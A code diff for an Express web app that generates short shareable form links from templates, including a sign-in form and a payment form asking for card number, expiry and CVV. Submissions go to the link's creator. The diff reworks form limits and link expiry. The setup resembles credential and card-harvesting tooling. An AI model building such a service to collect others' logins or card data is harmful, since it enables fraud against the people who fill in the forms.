+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
           { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
           { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
         ]
       }
     };
-
-    console.log(`Retrieved ${userSubmissions.length} submissions and ${Object.keys(userFormConfigs).length} forms for user ${userId}`);
-    res.json({
+    
+    const responseData = {
       submissions: userSubmissions.reverse(),
       formConfigs: userFormConfigs,
       templates,
       userId,
-      message: 'Dashboard data retrieved successfully'
+      maxFormsPerUser: adminSettings.maxFormsPerUser
+    };
+    console.log(`Returning data for user ${userId}:`, {
+      submissionCount: responseData.submissions.length,
+      formConfigCount: Object.keys(responseData.formConfigs).length,
+      templateKeys: Object.keys(responseData.templates),
+      userId: responseData.userId,
+      maxFormsPerUser: responseData.maxFormsPerUser
     });
+
+    res.json(responseData);
   } catch (error) {
     console.error('Error fetching data for /get:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to fetch dashboard data', details: error.message });
+    res.status(500).json({ error: 'Failed to fetch data', details: error.message });
   }
 });
 
@@ -1140,19 +1294,18 @@ app.post('/create', verifyToken, async (req, res) => {
     console.log('Received /create request:', req.body);
     const userId = req.user.userId;
     const adminSettings = await loadAdminSettings();
-
-    if (adminSettings.restrictionsEnabled) {
-      const formsToday = await countUserFormsToday(userId);
-      if (formsToday >= adminSettings.formsPerDay) {
-        return res.status(403).json({ error: `Form creation limit reached (${adminSettings.formsPerDay} forms per day)` });
-      }
+    
+    // Check form limit
+    const userFormCount = await countUserForms(userId);
+    if (userFormCount >= adminSettings.maxFormsPerUser) {
+      return res.status(403).json({ error: `Maximum form limit (${adminSettings.maxFormsPerUser}) reached` });
     }
 
     const templateId = req.body.template || 'sign-in';
     const formId = generateShortCode();
     const validActions = ['url', 'message'];
     const config = {
-      userId,
+      userId, // Associate form with user
       template: templateId,
       headerText: req.body.headerText || 'My Form',
       headerColors: Array.isArray(req.body.headerColors) ? req.body.headerColors.map(sanitizeForJs) : [],
@@ -1171,7 +1324,7 @@ app.post('/create', verifyToken, async (req, res) => {
       buttonMessage: req.body.buttonMessage || '',
       theme: req.body.theme === 'dark' ? 'dark' : 'light',
       createdAt: new Date().toISOString(),
-      expiresAt: adminSettings.restrictionsEnabled ? new Date(Date.now() + adminSettings.linkLifespanSeconds * 1000).toISOString() : null
+      expiresAt: new Date(Date.now() + adminSettings.linkLifespan).toISOString()
     };
 
     if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
@@ -1190,7 +1343,7 @@ app.post('/create', verifyToken, async (req, res) => {
     const host = req.headers.host || `localhost:${port}`;
     const url = `${protocol}://${host}/form/${formId}`;
     console.log('Generated URL:', url);
-    res.status(200).json({ url, formId });
+    res.status(200).json({ url, formId, expiresAt: config.expiresAt });
   } catch (error) {
     console.error('Error in /create:', error.message, error.stack);
     res.status(500).json({ error: 'Failed to generate shareable link', details: error.message });
@@ -1205,19 +1358,15 @@ app.put('/api/form/:id', verifyToken, async (req, res) => {
     const userId = req.user.userId;
     const updatedConfig = req.body;
 
+    // Check if form exists and belongs to the user
     if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
       console.error(`User ${userId} does not have access to form ${formId}`);
       return res.status(404).json({ error: 'Form not found or access denied' });
     }
 
-    const adminSettings = await loadAdminSettings();
-    if (adminSettings.restrictionsEnabled && formConfigs[formId].expiresAt && isFormExpired(formConfigs[formId].createdAt, adminSettings.linkLifespanSeconds)) {
-      return res.status(403).json({ error: 'Form has expired and cannot be updated' });
-    }
-
     const validActions = ['url', 'message'];
     const config = {
-      userId,
+      userId, // Maintain user association
       template: updatedConfig.template || formConfigs[formId].template,
       headerText: updatedConfig.headerText || formConfigs[formId].headerText || 'My Form',
       headerColors: Array.isArray(updatedConfig.headerColors) ? updatedConfig.headerColors.map(sanitizeForJs) : formConfigs[formId].headerColors,
@@ -1234,11 +1383,9 @@ app.put('/api/form/:id', verifyToken, async (req, res) => {
       buttonAction: validActions.includes(updatedConfig.buttonAction) ? updatedConfig.buttonAction : formConfigs[formId].buttonAction || 'url',
       buttonUrl: updatedConfig.buttonUrl ? normalizeUrl(updatedConfig.buttonUrl) : formConfigs[formId].buttonUrl || '',
       buttonMessage: updatedConfig.buttonMessage || formConfigs[formId].buttonMessage || '',
-      theme: updatedConfig.theme === 'dark' ? 'dark' : updatedConfig.theme === 'light'? 'light' : formConfigs[formId].theme || 'light', 
-                                                                                     
-      createdAt: formConfigs[formId].createdAt,
-      updatedAt: new Date().toISOString(),
-      expiresAt: adminSettings.restrictionsEnabled ? new Date(Date.now() + adminSettings.linkLifespanSeconds * 1000).toISOString() : formConfigs[formId].expiresAt
+      theme: updatedConfig.theme === 'dark' ? 'dark' : updatedConfig.theme === 'light'? 'light' : formConfigs[formId].theme || 'light',
+      createdAt: formConfigs[formId].createdAt, // Preserve original creation time
+      updatedAt: new Date().toISOString() // Update timestamp
     };
 
     if (config.buttonAction === 'url' && config.buttonUrl && !normalizeUrl(config.buttonUrl)) {
@@ -1268,20 +1415,19 @@ app.put('/api/form/:id', verifyToken, async (req, res) => {
 app.post('/form/:id/submit', async (req, res) => {
   const formId = req.params.id;
   
+  // Check if form exists and is not expired
   if (!formConfigs[formId]) {
     console.error(`Form not found for ID: ${formId}`);
     return res.status(404).json({ error: 'Form not found' });
   }
-
-  const adminSettings = await loadAdminSettings();
-  if (adminSettings.restrictionsEnabled && formConfigs[formId].expiresAt && isFormExpired(formConfigs[formId].createdAt, adminSettings.linkLifespanSeconds)) {
-    return res.status(403).json({ error: 'Form link has expired' });
+  if (await isFormExpired(formId)) {
+    return res.status(403).json({ error: 'Form has expired' });
   }
 
   try {
     const formData = req.body;
     const config = formConfigs[formId];
-    const userId = config.userId;
+    const userId = config.userId; // Get the form creator's userId
     const templates = {
       'sign-in': {
         name: 'Sign In Form',
@@ -1300,7 +1446,7 @@ app.post('/form/:id/submit', async (req, res) => {
       'payment-checkout': {
         name: 'Payment Checkout Form',
         fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
           { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
           { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
         ]
@@ -1317,7 +1463,7 @@ app.post('/form/:id/submit', async (req, res) => {
     });
 
     const submission = {
-      userId,
+      userId, // Associate submission with the form creator's userId
       formId,
       timestamp: new Date().toISOString(),
       data: mappedData
@@ -1344,12 +1490,17 @@ app.delete('/form/:id/submission/:index', verifyToken, async (req, res) => {
   const userId = req.user.userId;
 
   try {
+    // Check if form exists, belongs to user, and is not expired
     if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
       console.error(`User ${userId} does not have access to form ${formId}`);
       return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
     }
+    if (await isFormExpired(formId)) {
+      return res.status(403).json({ error: 'Form has expired' });
+    }
 
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    // Filter submissions by user and form
     const userFormSubmissions = submissions.filter(s => s.userId === userId && s.formId === formId);
 
     if (index < 0 || index >= userFormSubmissions.length) {
@@ -1357,6 +1508,7 @@ app.delete('/form/:id/submission/:index', verifyToken, async (req, res) => {
       return res.status(404).json({ error: 'Submission not found' });
     }
 
+    // Find the global index of this submission
     const submissionToDelete = userFormSubmissions[index];
     const globalIndex = submissions.findIndex(s => 
       s.userId === userId && s.formId === formId && s.timestamp === submissionToDelete.timestamp
@@ -1384,19 +1536,16 @@ app.delete('/form/:id', verifyToken, async (req, res) => {
   const userId = req.user.userId;
 
   try {
+    // Check if form exists, belongs to user, and is not expired
     if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
       console.error(`User ${userId} does not have access to form ${formId}`);
       return res.status(404).json({ error: 'Form not found or access denied' });
     }
 
-    const adminSettings = await loadAdminSettings();
-    if (adminSettings.restrictionsEnabled && formConfigs[formId].expiresAt && isFormExpired(formConfigs[formId].createdAt, adminSettings.linkLifespanSeconds)) {
-      return res.status(403).json({ error: 'Form has expired and cannot be deleted' });
-    }
-
     delete formConfigs[formId];
     await saveFormConfigs();
 
+    // Delete only user's submissions for this form
     const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
     const updatedSubmissions = submissions.filter(s => 
       !(s.userId === userId && s.formId === formId)
@@ -1415,15 +1564,9 @@ app.delete('/form/:id', verifyToken, async (req, res) => {
 app.get('/submissions', verifyToken, async (req, res) => {
   try {
     const userId = req.user.userId;
-    let submissions = [];
-    try {
-      const data = await fs.readFile(submissionsFile, 'utf8');
-      submissions = JSON.parse(data);
-    } catch (error) {
-      console.error(`Error reading or parsing submissions file: ${error.message}`);
-      submissions = [];
-    }
-
+    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+    
+    // Filter submissions by user
     const userSubmissions = submissions.filter(s => s.userId === userId);
 
     const templates = {
@@ -1444,19 +1587,18 @@ app.get('/submissions', verifyToken, async (req, res) => {
       'payment-checkout': {
         name: 'Payment Checkout Form',
         fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
           { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
           { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
         ]
       }
     };
-
+    
     console.log(`Retrieved ${userSubmissions.length} submissions for user ${userId}`);
     res.json({
       submissions: userSubmissions.reverse(),
       templates,
-      userId,
-      message: 'Submissions retrieved successfully'
+      userId
     });
   } catch (error) {
     console.error('Error fetching submissions:', error.message, error.stack);
@@ -1469,14 +1611,13 @@ app.get('/form/:id', async (req, res) => {
   const formId = req.params.id;
   const config = formConfigs[formId];
   
+  // Check if form exists and is not expired
   if (!config) {
     console.error(`Form not found for ID: ${formId}`);
     return res.status(404).send('Form not found');
   }
-
-  const adminSettings = await loadAdminSettings();
-  if (adminSettings.restrictionsEnabled && config.expiresAt && isFormExpired(config.createdAt, adminSettings.linkLifespanSeconds)) {
-    return res.status(403).send('Form link has expired');
+  if (await isFormExpired(formId)) {
+    return res.status(403).send('Form has expired');
   }
 
   const templates = {
@@ -1505,7 +1646,7 @@ app.get('/form/:id', async (req, res) => {
     'payment-checkout': {
       name: 'Payment Checkout Form',
       fields: [
-        { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
+        { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: 'true', regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
         { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
         { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
       ],
@@ -1583,6 +1724,7 @@ app.get('/api/form/:id', verifyToken, async (req, res) => {
   const userId = req.user.userId;
 
   try {
+    // Check if form exists, belongs to user, and is not expired
     const config = formConfigs[formId];
     if (!config) {
       console.error(`Form not found for ID: ${formId}`);
@@ -1592,16 +1734,14 @@ app.get('/api/form/:id', verifyToken, async (req, res) => {
       console.error(`User ${userId} does not have access to form ${formId}`);
       return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
     }
-
-    const adminSettings = await loadAdminSettings();
-    if (adminSettings.restrictionsEnabled && config.expiresAt && isFormExpired(config.createdAt, adminSettings.linkLifespanSeconds)) {
-      return res.status(403).json({ error: 'Form link has expired' });
+    if (await isFormExpired(formId)) {
+      return res.status(403).json({ error: 'Form has expired' });
     }
 
     console.log(`Retrieved form config for ${formId} for user ${userId}`);
     res.status(200).json({
       ...config,
-      formId,
+      formId, // Include formId in the response for clarity
       message: 'Form configuration retrieved successfully'
     });
   } catch (error) {
